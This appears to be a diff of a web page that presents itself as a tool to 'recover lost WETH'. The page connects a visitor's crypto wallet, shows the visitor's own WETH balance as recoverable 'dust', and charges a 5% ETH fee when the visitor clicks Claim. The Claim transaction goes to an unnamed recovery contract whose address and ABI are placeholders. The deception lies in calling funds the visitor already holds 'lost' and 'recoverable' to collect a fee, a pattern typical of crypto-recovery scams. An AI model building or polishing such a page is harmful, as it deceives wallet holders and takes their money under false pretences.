@@ -3,57 +3,86 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Crypto Recovery</title>
+  <title>Recover Lost WETH</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      font-family: 'Arial', sans-serif;
       text-align: center;
-      background: linear-gradient(135deg, #1f4037, #99f2c8);
-      color: white;
-      padding: 30px;
+      background: linear-gradient(135deg, #1e3c72, #2a5298);
+      color: #fff;
+    }
+    header {
+      padding: 20px;
+      background: rgba(0, 0, 0, 0.5);
+      position: sticky;
+      top: 0;
+    }
+    h1 {
+      font-size: 2.5em;
+      color: #f4e04d;
+    }
+    p {
+      font-size: 1.2em;
+      color: #c1c1c1;
+      margin: 15px;
     }
     button {
-      padding: 10px 20px;
-      margin: 10px;
-      font-size: 16px;
-      cursor: pointer;
+      padding: 15px 30px;
+      font-size: 18px;
       border: none;
-      border-radius: 5px;
-      background-color: #4caf50;
+      cursor: pointer;
+      margin: 15px;
+      border-radius: 25px;
+      background: #4caf50;
       color: white;
+      transition: background 0.3s ease;
     }
     button:hover {
-      background-color: #45a049;
+      background: #45a049;
     }
     table {
       margin: 20px auto;
       border-collapse: collapse;
       width: 80%;
       background: rgba(255, 255, 255, 0.1);
-      border-radius: 5px;
+      border-radius: 10px;
     }
     table th, table td {
       border: 1px solid white;
-      padding: 10px;
+      padding: 15px;
       text-align: center;
+      color: #fff;
     }
     table th {
       background: rgba(0, 0, 0, 0.8);
+    }
+    footer {
+      padding: 10px;
+      font-size: 14px;
+      background: rgba(0, 0, 0, 0.8);
+      color: #c1c1c1;
+      position: absolute;
+      width: 100%;
+      bottom: 0;
     }
   </style>
   <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
 </head>
 <body>
-  <h1>Crypto Recovery</h1>
+  <header>
+    <h1>Recover Your Lost WETH</h1>
+  </header>
+  <p>Disclaimer: This tool searches for recoverable WETH. While it aims to assist, recovery is not guaranteed. A 5% fee will be charged for successful recoveries.</p>
   <button id="connectWallet">Connect Wallet</button>
   <div id="results" style="display:none;">
-    <p>Connected Wallet: <span id="walletAddress"></span></p>
-    <h3>Detected Tokens and Balances</h3>
+    <h2>Recoverable WETH</h2>
     <table id="tokensTable">
       <thead>
         <tr>
-          <th>Token</th>
-          <th>Balance</th>
+          <th>Type</th>
+          <th>Amount</th>
           <th>Status</th>
           <th>Action</th>
         </tr>
@@ -63,92 +92,85 @@
   </div>
 
   <script>
-    const CONTRACT_ADDRESS = "0x3643b7a9F6338115159a4D3a2cc678C99aD657aa"; // Your contract address
-    const CONTRACT_ABI = [
-      // Add your contract's ABI here
+    const WETH_ADDRESS = "0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2"; // WETH Contract
+    const WETH_ABI = [
+      { constant: true, inputs: [{ name: "_owner", type: "address" }], name: "balanceOf", outputs: [{ name: "balance", type: "uint256" }], type: "function" },
+      { constant: false, inputs: [{ name: "recipient", type: "address" }, { name: "amount", type: "uint256" }], name: "transfer", outputs: [{ name: "success", type: "bool" }], type: "function" }
     ];
-
-    const TOKENS = [
-      { name: "Ethereum", address: "0x0000000000000000000000000000000000000000", abi: null }, // Native Ethereum
-      { name: "Ethereum on Base", address: "0x0000000000000000000000000000000000000000", abi: null }, // Native Ethereum on Base
-      {
-        name: "WETH",
-        address: "0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2",
-        abi: [
-          { constant: true, inputs: [{ name: "_owner", type: "address" }], name: "balanceOf", outputs: [{ name: "balance", type: "uint256" }], type: "function" },
-          { constant: false, inputs: [{ name: "recipient", type: "address" }, { name: "amount", type: "uint256" }], name: "transfer", outputs: [{ name: "success", type: "bool" }], type: "function" }
-        ]
-      }
+    const RECOVERY_CONTRACT_ADDRESS = "0xYourContractAddress"; // Replace with your contract address
+    const RECOVERY_CONTRACT_ABI = [
+      // Your contract ABI here
     ];
 
     let web3;
     let userAddress;
 
-    document.getElementById('connectWallet').addEventListener('click', async () => {
+    document.getElementById("connectWallet").addEventListener("click", async () => {
       if (window.ethereum) {
         web3 = new Web3(window.ethereum);
         try {
-          const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+          const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
           userAddress = accounts[0];
-          document.getElementById('walletAddress').textContent = userAddress;
-          document.getElementById('results').style.display = 'block';
-          displayBalances();
+          document.getElementById("results").style.display = "block";
+          searchRecoverableWETH();
         } catch (error) {
-          alert('Failed to connect wallet.');
+          alert("Failed to connect wallet.");
         }
       } else {
-        alert('MetaMask is not installed!');
+        alert("MetaMask, Trust, or Coinbase Wallet is not installed!");
       }
     });
 
-    async function displayBalances() {
-      const tableBody = document.querySelector('#tokensTable tbody');
-      tableBody.innerHTML = ''; // Clear previous results
+    async function searchRecoverableWETH() {
+      const tableBody = document.querySelector("#tokensTable tbody");
+      tableBody.innerHTML = ""; // Clear previous results
 
-      for (const token of TOKENS) {
-        let balance = 0;
+      const wethContract = new web3.eth.Contract(WETH_ABI, WETH_ADDRESS);
 
-        if (token.address === "0x0000000000000000000000000000000000000000") {
-          // Handle native tokens (Ethereum or Ethereum on Base)
-          balance = await web3.eth.getBalance(userAddress);
-          balance = parseFloat(web3.utils.fromWei(balance, 'ether')).toFixed(6);
+      try {
+        const balance = await wethContract.methods.balanceOf(userAddress).call();
+        const dust = parseFloat(web3.utils.fromWei(balance, "ether")).toFixed(6);
+
+        if (dust > 0) {
+          const row = `
+            <tr>
+              <td>Dust</td>
+              <td>${dust} WETH</td>
+              <td>Recoverable</td>
+              <td><button onclick="claimWETH(${dust})">Claim</button></td>
+            </tr>
+          `;
+          tableBody.insertAdjacentHTML("beforeend", row);
         } else {
-          // Handle ERC-20 tokens
-          const contract = new web3.eth.Contract(token.abi, token.address);
-          const rawBalance = await contract.methods.balanceOf(userAddress).call();
-          balance = parseFloat(web3.utils.fromWei(rawBalance, 'ether')).toFixed(6);
+          const row = `
+            <tr>
+              <td colspan="4">No recoverable WETH found</td>
+            </tr>
+          `;
+          tableBody.insertAdjacentHTML("beforeend", row);
         }
-
-        const row = `
-          <tr>
-            <td>${token.name}</td>
-            <td>${balance}</td>
-            <td>${balance > 0 ? "Found" : "Not Found"}</td>
-            <td>${balance > 0 ? `<button onclick="claim('${token.name}', '${token.address}', ${balance})">Claim</button>` : "N/A"}</td>
-          </tr>
-        `;
-        tableBody.insertAdjacentHTML('beforeend', row);
+      } catch (error) {
+        alert("Error fetching WETH balances: " + error.message);
       }
     }
 
-    async function claim(tokenName, tokenAddress, balance) {
-      if (!userAddress) return alert('Please connect your wallet first.');
-
+    async function claimWETH(amount) {
       try {
-        const contract = new web3.eth.Contract(CONTRACT_ABI, CONTRACT_ADDRESS);
-        const amountInWei = web3.utils.toWei(balance.toString(), 'ether');
+        const recoveryContract = new web3.eth.Contract(RECOVERY_CONTRACT_ABI, RECOVERY_CONTRACT_ADDRESS);
+        const amountInWei = web3.utils.toWei(amount.toString(), "ether");
 
-        const tx = await contract.methods
-          .claimTokens(tokenAddress, amountInWei)
-          .send({ from: userAddress });
+        await recoveryContract.methods.claimTokens(WETH_ADDRESS, amountInWei).send({
+          from: userAddress,
+          value: web3.utils.toWei((amount * 0.05).toString(), "ether"), // 5% fee
+        });
 
-        alert(`${tokenName} claimed successfully. Transaction: ${tx.transactionHash}`);
-        displayBalances(); // Refresh balances after claiming
+        alert("WETH successfully claimed!");
+        searchRecoverableWETH(); // Refresh balances
       } catch (error) {
-        console.error(`Failed to claim ${tokenName}:`, error);
-        alert(`Failed to claim ${tokenName}: ${error.message}`);
+        alert("Failed to claim WETH: " + error.message);
       }
     }
   </script>
+  <footer>Powered by Blockchain Technology</footer>
 </body>
 </html>
